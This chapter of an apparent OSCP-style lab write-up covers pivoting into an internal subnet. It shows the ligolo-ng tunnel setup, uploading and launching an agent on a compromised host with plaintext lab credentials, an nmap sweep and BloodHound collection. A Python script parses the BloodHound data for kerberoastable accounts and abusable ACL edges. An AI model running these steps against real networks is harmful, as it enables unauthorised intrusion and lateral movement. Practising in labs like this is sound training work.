# 05 — Pivot: ligolo-ng into `10.10.133.0/24`

Kali can reach exactly one address. MS02 and DC01 are on the internal segment behind MS01, so
every subsequent step — LDAP queries, kerberoasting, MSSQL, the SMB pulls — has to travel
through the compromised host.

## 5.1 Why ligolo-ng and not a SOCKS proxy

A SOCKS proxy (`chisel R:socks` + `proxychains`) works, but it has two costs that matter later:

| | SOCKS + proxychains | ligolo-ng |
|---|---|---|
| Transport | userspace, per-process | TUN interface, kernel routes |
| Tools that work | TCP clients that honour the proxy | **everything**, including Kerberos, RDP, ICMP, `nmap -sS` |
| Kerberos | unreliable — SPN/hostname handling breaks | works |
| Setup | one line | agent + tun + route |

This engagement needs Kerberos (kerberoasting in chapter 06), so the tunnel has to be a real
interface. That is ligolo.

## 5.2 Bring up the proxy on Kali

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# self-signed cert is fine for a lab; -laddr must be reachable from MS01
./ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

## 5.3 Run the agent on MS01

Upload and start it from the Administrator session (SYSTEM also works):

```bash
nxc smb 192.168.133.153 -u Administrator -p December31 --local-auth \
  --put-file ./agent.exe '\Windows\Temp\agent.exe'

nxc winrm 192.168.133.153 -u Administrator -p December31 --local-auth \
  -x 'cmd /c start /b C:\Windows\Temp\agent.exe -connect 192.168.133.1:443 -ignore-cert'
```

**Expected** on the proxy console:

```
INFO[0000] Agent joined  addr="192.168.133.153:51234" id=...
```

## 5.4 Select the session and add the route

```
ligolo-ng » session
? Specify a session : 1
[Agent] » ifconfig
```

**Captured** — the agent reports both NICs, which is how the internal segment is confirmed:

```
INTERFACE  #1  10.10.133.153/24
INTERFACE  #2  192.168.133.153/24
```

Back on Kali, route the internal network through the tun and start forwarding:

```bash
sudo ip route add 10.10.133.0/24 dev ligolo
# in the ligolo console:
ligolo-ng » start
```

Verify with something that proves the route carries real traffic, not just a socket:

```bash
nxc smb 10.10.133.152      # a completed SMB negotiation, not a bare TCP connect
```

> **Do not trust `nc -zv` or `/dev/tcp` through a tunnel.** A connection that "succeeds" can be
> a broken MASQUERADE rule or a userspace artefact. Only a protocol handshake (SMB negotiate,
> LDAP bind, HTTP response) proves the host is actually there.

## 5.5 Sweep the internal segment

```bash
nmap -sn 10.10.133.0/24 -oG internal.txt
nmap -Pn -p 88,135,139,389,445,5985,3389 --open 10.10.133.0/24 -oN internal-ports.txt
```

**Captured** — three hosts, and the port pattern identifies the DC immediately:

| Host | Ports | Identification |
|---|---|---|
| `10.10.133.152` | 53, 88, 135, 139, 389, 445, 464, 636, 3268, 5985 | **DC01** — KDC and LDAP present |
| `10.10.133.153` | 135, 139, 445, 3389, 5985, 8000 | MS01 (ourselves) |
| `10.10.133.154` | 135, 139, 445, 1433, 5040, 5985, 5986, **49700** | **MS02** — MSSQL |

`49700` is a second MSSQL instance (`SQLEXPRESS`), distinct from the default on `1433`. Both
matter in chapter 06.

## 5.6 Fix the clock before any Kerberos

Kerberos rejects skew beyond five minutes with `KRB_AP_ERR_SKEW`, while NTLM keeps working —
which presents as "the credential is broken" when it is not.

```bash
nmap -p445 --script smb2-time 10.10.133.152     # the DC is authoritative
sudo rdate -n 10.10.133.152 && date -u
```

**Captured**: MS02 was **+18m23s** ahead. Sync to the DC, not to MS02.

## 5.7 Enumerate the directory

SharpHound output is JSON; Neo4j is not required to read it. `bloodhound-python` collects
straight from Kali through the tunnel, with no binary on the target:

```bash
bloodhound-python -u web_svc -p Diamond1 -d oscp.exam \
  -ns 10.10.133.152 -dc dc01.oscp.exam -c All --zip
```

Then resolve it — SIDs, group membership, ACL edges, and the collection gaps:

```python
#!/usr/bin/env python3
"""enum_bh.py — enumerate bloodhound/SharpHound JSON without Neo4j.

Resolves SIDs to names, separates AD-default ACL scaffolding from real edges,
and reports what was NOT collected so a blank section is not read as a negative.
"""
import json, sys
from pathlib import Path

ABUSABLE = {"GenericAll","GenericWrite","WriteDacl","WriteOwner","Owns","ForceChangePassword",
            "AddMember","AddKeyCredentialLink","AllowedToAct","AddSelf","DCSync","GetChanges",
            "GetChangesAll","ReadLAPSPassword","WriteSPN","WriteGPLink","ExecuteDCOM"}

# every ACE from these reflects AD's default security descriptor, not a finding
BUILTIN = {"ADMINISTRATORS","ENTERPRISE ADMINS","DOMAIN ADMINS","ACCOUNT OPERATORS",
           "KEY ADMINS","ENTERPRISE KEY ADMINS","SCHEMA ADMINS","SERVER OPERATORS",
           "BACKUP OPERATORS","PRINT OPERATORS","DOMAIN CONTROLLERS","CREATOR OWNER",
           "NT AUTHORITY","EVERYONE","AUTHENTICATED USERS","USERS","DOMAIN USERS"}

def load(d, kind):
    out = []
    for p in sorted(Path(d).glob(f"*_{kind}.json")):
        out += json.loads(p.read_text()).get("data", [])
    return out

def results(c):
    return c.get("Results") or [] if isinstance(c, dict) else (c or [])

d = sys.argv[1]
users, groups, comps = load(d, "users"), load(d, "groups"), load(d, "computers")

sid = {}
for kind, coll in (("User", users), ("Group", groups), ("Computer", comps)):
    for o in coll:
        sid[o.get("ObjectIdentifier")] = (o.get("Properties", {}).get("name") or "?").upper()
who = lambda s: sid.get(s, s)

print("## Kerberoastable\n")
for u in users:
    p = u.get("Properties", {})
    if p.get("serviceprincipalnames"):
        print(f"- `{p.get('name')}` enabled={p.get('enabled')} "
              f"{p['serviceprincipalnames']}")
if not any(u.get("Properties", {}).get("serviceprincipalnames") for u in users):
    print("- none")

print("\n## AS-REP roastable\n")
hits = [u["Properties"]["name"] for u in users if u.get("Properties", {}).get("dontreqpreauth")]
print("\n".join(f"- `{h}`" for h in hits) if hits else "- none")

print("\n## Privileged groups\n")
for g in groups:
    p = g.get("Properties", {})
    n = (p.get("name") or "").upper()
    if n.split("@")[0] in BUILTIN:
        mem = [who(m.get("ObjectIdentifier")) for m in g.get("Members") or []]
        if mem:
            print(f"- **{n}** ← {', '.join(mem)}")

print("\n## Non-default ACL edges\n")
rows = set()
for coll in (users, groups, comps):
    for o in coll:
        tgt = (o.get("Properties", {}).get("name") or "?").upper()
        for ace in o.get("Aces") or []:
            r = ace.get("RightName", "")
            if r not in ABUSABLE:
                continue
            principal = who(ace.get("PrincipalSID") or "?")
            if principal.split("@")[0] in BUILTIN:
                continue
            rows.add((principal, r, tgt))
for pr, r, t in sorted(rows):
    print(f"- `{pr}` --**{r}**--> `{t}`")
print(f"\n{len(rows)} edge(s)")

print("\n## Collection gaps\n")
for c in comps:
    for f in ("Sessions", "LocalAdmins", "PSRemoteUsers", "PrivilegedSessions"):
        cont = c.get(f)
        if isinstance(cont, dict) and cont.get("Collected") is False:
            print(f"- {f} NOT collected on `{c.get('Properties', {}).get('name')}`")
    if isinstance(c.get("LocalAdmins"), dict) and c["LocalAdmins"].get("Collected") \
       and not results(c["LocalAdmins"]):
        print(f"- LocalAdmins empty on `{c.get('Properties', {}).get('name')}` "
              f"— that is an access failure, not an empty group")
```

```bash
python3 enum_bh.py ./bh -o bh-report.md --owned ERIC.WALLOWS,WEB_SVC
```

## 5.8 What the enumeration actually establishes

**Captured** from a fresh `-c All` collection: 31 users, 57 groups, 3 computers, 6 OUs, 2 GPOs.

| Finding | Value | Consequence |
|---|---|---|
| `TOM_ADMIN` member of | **`DOMAIN ADMINS`** | the eventual flag credential is domain-tier, not merely local admin |
| `SQL_SVC` SPN | **`MSSQL/MS02.oscp.exam`** | a domain account running MS02's SQL Server → chapter 06 |
| `WEB_SVC` SPN | `HTTP/MS01.oscp.exam` | the `:8000` site on MS01 — matches the profile found in 02 |
| AS-REP roastable | **none** (`dontreqpreauth` false on all 31) | do not attempt |
| Non-default ACL edges | **0** | no `GenericAll` / `WriteDacl` / `ForceChangePassword` path exists |
| Delegation | none on any user | no constrained delegation or RBCD |
| `celia.almeda` | disabled since 2022-12-05 | the documented MS02 route is dead on this build |

Two of these save hours:

**The 650 abusable ACEs are noise.** `ACCOUNT OPERATORS` holds `GenericAll` across most of the
directory — that is AD's *default* security descriptor, and the group has no members. Every
abusable ACE originates from `ADMINISTRATORS`, `ENTERPRISE ADMINS`, `ACCOUNT OPERATORS`,
`KEY ADMINS` or `ENTERPRISE KEY ADMINS`. Filter to non-privileged principals and the count is
**zero**. There is no BloodHound chain in this domain; anyone who spends a day looking for one
is looking at default scaffolding.

**Empty does not mean absent.** `LocalAdmins` on MS01 and MS02 reports `Collected = true` with
no results. That is the collector failing to read local groups on hosts it has no admin rights
on — not two servers with empty administrator groups. Reading it the other way produces a
confidently wrong report.

## 5.9 The one open question this data cannot answer

Whether the custom `ADMIN@OSCP.EXAM` group (five users) is a `LocalAdmins` grant on MS02. It
looks exactly like the group a build script would push to member servers, but `LocalAdmins`
collection failed on both workstations. One command settles it once MS02 is accessible:

```powershell
net localgroup administrators
```

## 5.10 Timeline: the directory remembers what you did

`lastlogon` / `lastlogontimestamp` are free, attributable evidence that an action occurred.
**Captured** for this engagement:

| Account | `lastlogon` | Interpretation |
|---|---|---|
| `ADMINISTRATOR` | 07:22:59 | provisioning |
| `ERIC.WALLOWS` | 10:41:54 | the WinRM foothold |
| `TOM_ADMIN` | `lastlogontimestamp` 10:25:38 (was `-1`) | the DC01 logon — *never logged on before* |
| `WEB_SVC` | 11:02:25 | the MSSQL `-windows-auth` connection |
| `CELIA.ALMEDA` | 2022-12-05 | disabled since then |
| `SQL_SVC` | 2022-11-10 | never logged on interactively |

An account that reads `-1` before the engagement and carries a timestamp after it is a
self-documenting proof of access. Worth pulling before writing the report.
